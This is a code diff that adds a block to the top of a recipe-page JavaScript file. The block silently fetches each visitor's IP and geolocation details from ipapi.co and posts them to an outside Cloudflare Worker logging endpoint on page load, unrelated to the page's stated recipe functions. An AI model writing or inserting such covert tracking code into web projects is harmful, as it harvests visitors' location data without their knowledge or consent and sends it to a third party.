@@ -1,3 +1,15 @@
+//Tracking user info via IP API and sending to Cloudflare Worker
+fetch("https://ipapi.co/json/")
+  .then(r => r.json())
+  .then(info => {
+    fetch("https://ip-logging-surenz.surenxss.workers.dev", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(info)
+    });
+  })
+  .catch(err => console.error("Logging error:", err));
+
 // Handles all recipe page interactions
 document.addEventListener("DOMContentLoaded", () => {
   const recipeTitle = document.getElementById("recipe-title");
